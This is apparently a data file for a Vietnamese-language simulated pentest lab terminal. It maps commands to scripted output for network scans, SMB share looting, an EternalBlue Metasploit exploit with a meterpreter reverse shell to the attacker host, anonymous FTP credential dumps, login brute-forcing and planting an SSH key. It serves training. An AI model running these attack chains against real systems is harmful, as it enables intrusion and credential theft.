window.LabData = window.LabData || {};

window.LabData.COMMANDS = {
  "nmap -sn 192.168.202.0/24": `Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for kali (192.168.202.132)
Host is up (0.00012s latency).
Nmap scan report for ubuntu (192.168.202.136)
Host is up (0.00045s latency).
Nmap scan report for win7 (192.168.202.137)
Host is up (0.00051s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.14 seconds`,

  "nmap -sV -p 139,445 192.168.202.137": `PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Windows 7 SP1
445/tcp open  microsoft-ds Windows 7 SP1
MAC Address: 00:0C:29:48:D1:30 (VMware)
OS: Windows 7 Ultimate 7601 SP1 (32-bit)`,

  "nmap -sV -p 139,445 192.168.202.136": `PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 00:0C:29:D4:E1:C3 (VMware)
OS: Linux Ubuntu`,

  "nmap -p445 --script smb-vuln-ms17-010 192.168.202.137": `Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1
|     State: VULNERABLE
|     IDs: CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14`,

  "enum4linux -a 192.168.202.136": `[+] Got domain/workgroup name: WORKGROUP
[+] Server 192.168.202.136 allows sessions using username='', password=''
[+] Share Enumeration:
    Sharename    Type    Comment
    ---------    ----    -------
    public       Disk    
    IPC$         IPC     IPC Service
[+] Attempting to map shares:
//192.168.202.136/public    Mapping: OK  Listing: OK  Writing: OK`,

  "smbclient -L 192.168.202.136 -N": `Sharename    Type    Comment
---------    ----    -------
public       Disk    
IPC$         IPC     IPC Service (ubuntu server)`,

  "smbclient //192.168.202.136/public -N": `Try "help" to get a list of possible commands.`,

  "ls": `  .                        D    0  Mon Nov 10 20:35:37 2026
  ..                       D    0  Mon Nov 10 20:35:37 2026
  secret.txt               N   27  Mon Nov 10 20:35:37 2026
  config.bak               N  512  Mon Nov 10 20:35:37 2026
  passwords.txt            N  128  Mon Nov 10 20:35:37 2026
20458536 blocks of size 1024. 11817784 blocks available`,

  "get secret.txt": `getting file \\secret.txt of size 27 as secret.txt (26.4 KiloBytes/sec) (average 26.4 KiloBytes/sec)
[+] File downloaded successfully!
Content: "Day la file bi lo hong SMB"`,

  "get passwords.txt": `getting file \\passwords.txt of size 128 as passwords.txt
[+] File downloaded successfully!
Content: "admin:P@ssw0rd123 | hacker:1234"`,

  "get config.bak": `getting file \\config.bak of size 512 as config.bak
[+] File downloaded successfully!
Content: "[global] workgroup = WORKGROUP | map to guest = Bad User"`,

  "msfconsole": `       =[ metasploit v6.3.44-dev                          ]
+ -- --=[ 2654 exploits - 1338 auxiliary - 2141 payloads ]
+ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion  ]`,

  "use exploit/windows/smb/ms17_010_psexec": `[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp`,

  "set RHOSTS 192.168.202.137": `RHOSTS => 192.168.202.137`,
  "set LHOST 192.168.202.132": `LHOST => 192.168.202.132`,
  "set PAYLOAD windows/meterpreter/reverse_tcp": `PAYLOAD => windows/meterpreter/reverse_tcp`,
  "set SMBUser hacker": `SMBUser => hacker`,
  "set SMBPass 1234": `SMBPass => 1234`,

  "exploit": `[*] Started reverse TCP handler on 192.168.202.132:4444
[*] 192.168.202.137:445 - Target OS: Windows 7 Ultimate 7601 SP1
[*] 192.168.202.137:445 - Built a write-what-where primitive...
[+] 192.168.202.137:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.202.137:445 - Selecting PowerShell target
[*] 192.168.202.137:445 - Executing the payload...
[*] Sending stage (199238 bytes) to 192.168.202.137
[*] Meterpreter session 1 opened (192.168.202.132:4444 -> 192.168.202.137:49169)`,

  "getuid": `Server username: NT AUTHORITY\\SYSTEM`,

  "sysinfo": `Computer        : WIN7-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x86
System Language : vi_VN
Logged On Users : 2
Meterpreter     : x86/windows`,

  "shell": `Process 648 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.`,

  "whoami": `nt authority\\system`,

  "net user": `User accounts for \\\\WIN7-PC
-------------------------------------------------------------------------------
Administrator            Guest                    hacker
The command completed successfully.`,

  "ifconfig": `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.202.132  netmask 255.255.255.0  broadcast 192.168.202.255
        ether 00:0c:29:1a:9f:7b  txqueuelen 1000  (Ethernet)`,

  "ipconfig": `Windows IP Configuration
Ethernet adapter Local Area Connection:
   IPv4 Address. . . . . . . . . . . : 192.168.202.137
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.202.2`,

  "show options": `Module options (exploit/windows/smb/ms17_010_psexec):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   RHOSTS    192.168.202.137  yes       The target host(s)
   RPORT     445              yes       The SMB service port (TCP)
   SMBUser   hacker           no        The username to authenticate as
   SMBPass   1234             no        The password for the specified username
   LHOST     192.168.202.132  yes       The listen address`,

  "nmap -p 21,80 -sV --script=banner,ftp-syst 192.168.202.136 192.168.202.137": `Starting Nmap 7.991 ( https://nmap.org )
Nmap scan report for 192.168.202.136 (Ubuntu Server)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
|_banner: 220 (vsFTPd 3.0.5)
| ftp-syst: 
|   STAT: 
|     Connected to ::ffff:192.168.202.132 / Logged in as ftp
|_    vsFTPd 3.0.5 - secure, fast, stable
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)

Nmap scan report for 192.168.202.137 (Microsoft Windows)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
80/tcp filtered http`,

  "nmap -p 21 --script=ftp-anon 192.168.202.136": `Nmap scan report for 192.168.202.136
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              29 Nov 10 20:40 allowed.userlist
| -rw-r--r--    1 0        0              62 Nov 10 20:40 allowed.userlist.passwd
|_-rw-r--r--    1 0        0               0 Nov 10 20:42 tai_lieu_noi_bo.txt`,

  "paste allowed.userlist allowed.userlist.passwd": `aron            root
pwnmeow         Supersecretpassword1
egotisticalsw   @BaASD&9032123sADS
admin           rKXM59ESxesUFHAd`,

  'nmap -p 80 --script=http-methods,http-title --script-args "http-methods.url-path=/login.php" 192.168.202.136': `PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder/login page (200 OK)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS`,

  'nmap -p 80 --script=http-form-brute --script-args "http-form-brute.path=/login.php,userdb=allowed.userlist,passdb=allowed.userlist.passwd" 192.168.202.136': `PORT   STATE SERVICE
80/tcp open  http
| http-form-brute:
|   Accounts:
|     admin:rKXM59ESxesUFHAd - Valid credentials
|_  Statistics: Performed 16 guesses in 2 seconds, average tps: 8.0`,

  "use auxiliary/scanner/ssh/ssh_enumusers": `[*] Loaded module auxiliary/scanner/ssh/ssh_enumusers`,
  "set RHOSTS 192.168.202.136": `RHOSTS => 192.168.202.136`,
  "set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt": `USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt`,
  "set ACTION Timing Attack": `ACTION => Timing Attack`,

  "ssh_enum_run": `[*] 192.168.202.136:22 - SSH - Using timing attack technique
[*] 192.168.202.136:22 - SSH - Checking for false positives
[*] 192.168.202.136:22 - SSH - Starting scan
[+] 192.168.202.136:22 - SSH - User 'vboxuser' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed`,

  'ssh-keygen -t rsa -f /home/kali/leaked_key -N ""': `Generating public/private rsa key pair.
Your identification has been saved in /home/kali/leaked_key
Your public key has been saved in /home/kali/leaked_key.pub
The key fingerprint is:
SHA256:8xK9pLm2vQ7rT4wZ1nB5cF6yH3jD0gS2kM9pV4xR1aE kali@kali`,

  "ssh-copy-id -i /home/kali/leaked_key.pub vboxuser@192.168.202.136": `/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/home/kali/leaked_key.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s)
Number of key(s) added: 1
Now try logging into the machine, with: "ssh 'vboxuser@192.168.202.136'"`,

  "use auxiliary/scanner/ssh/ssh_login_pubkey": `[*] Loaded module auxiliary/scanner/ssh/ssh_login_pubkey`,
  "set USERNAME vboxuser": `USERNAME => vboxuser`,
  "set KEY_PATH /home/kali/leaked_key": `KEY_PATH => /home/kali/leaked_key`,

  "ssh_pubkey_run": `[+] 192.168.202.136:22 - Success: 'vboxuser' with key /home/kali/leaked_key
[*] Command shell session 1 opened (192.168.202.132:41892 -> 192.168.202.136:22)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed`,

  "sessions -i 1": `[*] Starting interaction with 1...
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)`,

  "sudo nmap -n -F --open 192.168.202.136": `Starting Nmap 7.99 ( https://nmap.org )
Nmap scan report for 192.168.202.136
Host is up (0.00046s latency).
Not shown: 99 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:D4:E1:C3 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds`,

  "sudo nmap -sn -n --send-ip --packet-trace 192.168.202.136": `SENT (0.0082s) ICMP [192.168.202.132 > 192.168.202.136 Echo request (type=8/code=0) id=41205 seq=0] IP [ttl=51 id=19284 iplen=28 ]
RCVD (0.0091s) ICMP [192.168.202.136 > 192.168.202.132 Echo reply (type=0/code=0) id=41205 seq=0] IP [ttl=64 id=30192 iplen=28 ]
Nmap scan report for 192.168.202.136
Host is up (0.00090s latency).
MAC Address: 00:0C:29:D4:E1:C3 (VMware)`,

  "sudo nmap -sn -n -PS80 -D 192.168.202.50,192.168.202.60 --send-ip --packet-trace 192.168.202.136": `SENT (0.0120s) TCP 192.168.202.132:45123 > 192.168.202.136:80 S ttl=54 id=21345 iplen=44  seq=1092837465 win=1024 <mss 1460>
SENT (0.0121s) TCP 192.168.202.50:45123 > 192.168.202.136:80 S ttl=54 id=54321 iplen=44  seq=1092837465 win=1024 <mss 1460>
SENT (0.0122s) TCP 192.168.202.60:45123 > 192.168.202.136:80 S ttl=54 id=12398 iplen=44  seq=1092837465 win=1024 <mss 1460>
RCVD (0.0135s) TCP 192.168.202.136:80 > 192.168.202.132:45123 SA ttl=64 id=0 iplen=44  seq=3847561920 win=64240 <mss 1460>
Nmap scan report for 192.168.202.136
Host is up (0.0015s latency).
MAC Address: 00:0C:29:D4:E1:C3 (VMware)`,

  'sudo nmap -n -p 80 -sV --script "http-headers,http-title" 192.168.202.136': `PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-headers:
|   Date: Wed, 11 Nov 2026 09:50:12 GMT
|   Server: Apache/2.4.52 (Ubuntu)
|   Connection: close
|_  Content-Type: text/html; charset=UTF-8`,

  "sudo nmap -n -p 80 --script http-enum 192.168.202.136": `PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /admin/: Potentially interesting folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing`,

  "curl http://192.168.202.136/admin/pass.txt": `Tai khoan: admin | Mat khau: 123456@Abc`,

  "help": `Danh sách lệnh hỗ trợ:
  1. Quét mạng     : nmap -sn 192.168.202.0/24
                     nmap -sV -p 139,445 192.168.202.137
                     nmap -sV -p 139,445 192.168.202.136
  2. Dò lỗ hổng    : nmap -p445 --script smb-vuln-ms17-010 192.168.202.137
                     enum4linux -a 192.168.202.136
  3. Khai thác SMB : smbclient -L 192.168.202.136 -N
                     smbclient //192.168.202.136/public -N  -> ls -> get secret.txt -> exit
  4. EternalBlue   : msfconsole -> use exploit/windows/smb/ms17_010_psexec
                     -> set RHOSTS 192.168.202.137 -> set LHOST 192.168.202.132
                     -> set PAYLOAD windows/meterpreter/reverse_tcp
                     -> set SMBUser hacker -> set SMBPass 1234 -> exploit
                     -> getuid -> sysinfo -> shell -> whoami -> net user
  5. Khảo sát FTP  : nmap -sV -p 21,80 --script banner,ftp-syst,http-server-header 192.168.202.136 192.168.202.137
                     nmap -p 21 --script ftp-anon 192.168.202.136
  6. FTP sang Web  : ftp -n 192.168.202.136 -> paste allowed.userlist allowed.userlist.passwd
                     -> nmap -p 80 --script http-enum,http-methods 192.168.202.136
                     -> curl -s -u admin:rKXM59ESxesUFHAd http://192.168.202.136/dashboard.php
  [*] Lệnh khác    : help, clear, exit, ifconfig, ipconfig, show options`
};
